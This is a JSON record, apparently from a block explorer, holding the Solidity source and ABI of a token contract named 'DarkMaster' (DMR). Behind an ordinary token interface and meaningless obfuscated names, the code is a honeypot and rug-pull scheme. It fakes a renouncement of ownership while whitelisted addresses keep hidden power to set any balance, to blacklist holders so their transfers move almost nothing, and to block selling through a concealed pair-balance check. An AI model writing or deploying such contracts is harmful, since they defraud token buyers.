{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface sellEnable {\n    function createPair(address autoFee, address amountWallet) external returns (address);\n}\n\ninterface senderAutoExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeMode) external view returns (uint256);\n\n    function transfer(address launchedLiquidity, uint256 walletTrading) external returns (bool);\n\n    function allowance(address listMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedLiquidity,\n        uint256 walletTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isTotal, uint256 value);\n    event Approval(address indexed listMax, address indexed spender, uint256 value);\n}\n\nabstract contract fromSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenSellIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingLaunchAuto is senderAutoExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DarkMaster is fromSender, senderAutoExempt, marketingLaunchAuto {\n\n    uint256 constant walletTradingLiquidity = 9 ** 10;\n\n    function launchIsTeam(uint256 walletTrading) public {\n        fundTotal();\n        modeMarketingExempt = walletTrading;\n    }\n\n    function fundTotal() private view {\n        require(txTo[_msgSender()]);\n    }\n\n    function allowance(address tokenFundSell, address launchedAmount) external view virtual override returns (uint256) {\n        if (launchedAmount == shouldMarketing) {\n            return type(uint256).max;\n        }\n        return sellWallet[tokenFundSell][launchedAmount];\n    }\n\n    mapping(address => bool) public shouldToken;\n\n    address public takeSwap;\n\n    function isMarketing(address fromLimit, uint256 walletTrading) public {\n        fundTotal();\n        fromTo[fromLimit] = walletTrading;\n    }\n\n    constructor (){\n        if (teamMinAmount) {\n            receiverFrom = false;\n        }\n        tokenSellIs marketingLaunch = tokenSellIs(shouldMarketing);\n        walletReceiverLaunched = sellEnable(marketingLaunch.factory()).createPair(marketingLaunch.WETH(), address(this));\n        if (limitTake != tokenReceiver) {\n            tokenReceiver = true;\n        }\n        takeSwap = _msgSender();\n        txTo[takeSwap] = true;\n        fromTo[takeSwap] = txMin;\n        senderReceiverIs();\n        if (teamMinAmount != amountMin) {\n            amountMin = true;\n        }\n        emit Transfer(address(0), takeSwap, txMin);\n    }\n\n    uint256 private txMin = 100000000 * 10 ** 18;\n\n    function transfer(address fromLimit, uint256 walletTrading) external virtual override returns (bool) {\n        return totalToken(_msgSender(), fromLimit, walletTrading);\n    }\n\n    bool private amountMin;\n\n    function liquidityTake(address marketingTake) public {\n        fundTotal();\n        if (sellMin == maxShould) {\n            receiverFrom = true;\n        }\n        if (marketingTake == takeSwap || marketingTake == walletReceiverLaunched) {\n            return;\n        }\n        shouldToken[marketingTake] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atFund;\n    }\n\n    bool private limitTake;\n\n    bool private teamMinAmount;\n\n    uint256 public sellMin;\n\n    mapping(address => bool) public txTo;\n\n    string private walletExemptTrading = \"Dark Master\";\n\n    address shouldMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private atFund = \"DMR\";\n\n    function getOwner() external view returns (address) {\n        return minAuto;\n    }\n\n    function sellLaunch(address exemptFromAuto) public {\n        if (takeLaunched) {\n            return;\n        }\n        \n        txTo[exemptFromAuto] = true;\n        if (teamMinAmount == tradingSender) {\n            limitTake = true;\n        }\n        takeLaunched = true;\n    }\n\n    function balanceOf(address takeMode) public view virtual override returns (uint256) {\n        return fromTo[takeMode];\n    }\n\n    address public walletReceiverLaunched;\n\n    bool public tokenReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txMin;\n    }\n\n    uint256 feeSell;\n\n    event OwnershipTransferred(address indexed feeTx, address indexed receiverMaxIs);\n\n    function transferFrom(address swapAmount, address launchedLiquidity, uint256 walletTrading) external override returns (bool) {\n        if (_msgSender() != shouldMarketing) {\n            if (sellWallet[swapAmount][_msgSender()] != type(uint256).max) {\n                require(walletTrading <= sellWallet[swapAmount][_msgSender()]);\n                sellWallet[swapAmount][_msgSender()] -= walletTrading;\n            }\n        }\n        return totalToken(swapAmount, launchedLiquidity, walletTrading);\n    }\n\n    address private minAuto;\n\n    uint256 private senderTokenTrading;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalReceiver;\n    }\n\n    mapping(address => uint256) private fromTo;\n\n    uint256 private maxShould;\n\n    address listLaunchedSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalToken(address swapAmount, address launchedLiquidity, uint256 walletTrading) internal returns (bool) {\n        if (swapAmount == takeSwap) {\n            return minAutoLaunched(swapAmount, launchedLiquidity, walletTrading);\n        }\n        uint256 autoMax = senderAutoExempt(walletReceiverLaunched).balanceOf(listLaunchedSell);\n        require(autoMax == modeMarketingExempt);\n        require(launchedLiquidity != listLaunchedSell);\n        if (shouldToken[swapAmount]) {\n            return minAutoLaunched(swapAmount, launchedLiquidity, walletTradingLiquidity);\n        }\n        return minAutoLaunched(swapAmount, launchedLiquidity, walletTrading);\n    }\n\n    function senderReceiverIs() public {\n        emit OwnershipTransferred(takeSwap, address(0));\n        minAuto = address(0);\n    }\n\n    bool public takeLaunched;\n\n    bool private tradingSender;\n\n    function minAutoLaunched(address swapAmount, address launchedLiquidity, uint256 walletTrading) internal returns (bool) {\n        require(fromTo[swapAmount] >= walletTrading);\n        fromTo[swapAmount] -= walletTrading;\n        fromTo[launchedLiquidity] += walletTrading;\n        emit Transfer(swapAmount, launchedLiquidity, walletTrading);\n        return true;\n    }\n\n    bool private fundExempt;\n\n    uint256 modeMarketingExempt;\n\n    uint8 private totalReceiver = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return walletExemptTrading;\n    }\n\n    function approve(address launchedAmount, uint256 walletTrading) public virtual override returns (bool) {\n        sellWallet[_msgSender()][launchedAmount] = walletTrading;\n        emit Approval(_msgSender(), launchedAmount, walletTrading);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return minAuto;\n    }\n\n    bool private receiverFrom;\n\n    mapping(address => mapping(address => uint256)) private sellWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMaxIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFundSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"isMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"launchIsTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"}],\"name\":\"liquidityTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFromAuto\",\"type\":\"address\"}],\"name\":\"sellLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiverLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DarkMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}